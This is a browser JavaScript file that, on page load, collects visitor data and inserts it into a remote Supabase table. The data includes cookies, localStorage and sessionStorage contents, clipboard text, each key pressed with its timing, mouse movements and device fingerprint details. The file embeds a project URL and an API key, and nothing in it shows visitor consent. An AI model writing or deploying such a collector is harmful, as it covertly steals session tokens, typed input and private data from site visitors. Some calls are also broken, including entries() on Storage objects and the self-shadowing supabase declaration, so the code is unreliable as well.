// script.js

// Supabase configuration
const supabaseUrl = 'https://gsmnzfbcxmhywznchoxq.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdzbW56ZmJjeG1oeXd6bmNob3hxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY4NzI4NDgsImV4cCI6MjA3MjQ0ODg0OH0.0seF_SbMoSP5RkEZRGLcfDM07yE2T0EdyGgpgXFcs6c';
const supabase = supabase.createClient(supabaseUrl, supabaseAnonKey);

async function insertDeviceInfo(deviceInfo) {
  const { data, error } = await supabase
    .from('device_info')
    .insert([deviceInfo])
    .select();
  if (error) {
    console.error('Error inserting device info:', error);
  } else {
    console.log('Device info inserted successfully:', data);
  }
}

function getDeviceInfo() {
  const deviceInfo = {};

  // Device Type
  deviceInfo.device_type = navigator.userAgent;

  // Browser Version
  deviceInfo.browser_version = navigator.appVersion;

  // Operating System
  deviceInfo.operating_system = navigator.platform;

  // Screen Resolution
  deviceInfo.screen_resolution = `${window.screen.width}x${window.screen.height}`;

  // Time Zone
  deviceInfo.time_zone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // Installed Fonts
  deviceInfo.installed_fonts = [...document.fonts.values()].map(font => font.family);

  // Installed Plugins
  deviceInfo.installed_plugins = Array.from(navigator.plugins).map(plugin => plugin.name);

  // Battery Status
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery_status = battery.level;
    });
  }

  // Language Settings
  deviceInfo.language_settings = navigator.languages;

  // Hardware Specs
  deviceInfo.hardware_specs = {
    cpuCores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory
  };

  // Browser Fingerprint
  deviceInfo.browser_fingerprint = window.navigator.userAgent + window.navigator.appVersion;

  // Clipboard Content
  navigator.clipboard.readText().then(text => {
    deviceInfo.clipboard_content = text;
  }).catch(err => {
    console.error('Clipboard read error:', err);
  });

  // Mouse Movements
  const mouseMovements = [];
  document.addEventListener('mousemove', (event) => {
    mouseMovements.push({ x: event.clientX, y: event.clientY });
  });
  deviceInfo.mouse_movements = mouseMovements;

  // Keystroke Timing
  const keystrokeTiming = [];
  document.addEventListener('keydown', (event) => {
    keystrokeTiming.push({ key: event.key, time: new Date().getTime() });
  });
  deviceInfo.keystroke_timing = keystrokeTiming;

  // Downloaded Files
  deviceInfo.downloaded_files = [];

  // Session Data
  deviceInfo.session_data = Object.fromEntries(sessionStorage.entries());

  // Clipboard Hijack
  deviceInfo.clipboard_hijack = false;

  // Webcam Access
  deviceInfo.webcam_access = false;

  // Microphone Access
  deviceInfo.microphone_access = false;

  // Fingerprinting
  deviceInfo.fingerprinting = false;

  // Browser Cookies
  deviceInfo.browser_cookies = document.cookie;

  // Browser Local Storage
  deviceInfo.browser_local_storage = Object.fromEntries(localStorage.entries());

  // Browser All Session Data
  deviceInfo.browser_all_session_data = Object.fromEntries(sessionStorage.entries());

  return deviceInfo;
}

document.addEventListener('DOMContentLoaded', () => {
  const deviceInfo = getDeviceInfo();
  insertDeviceInfo(deviceInfo);
});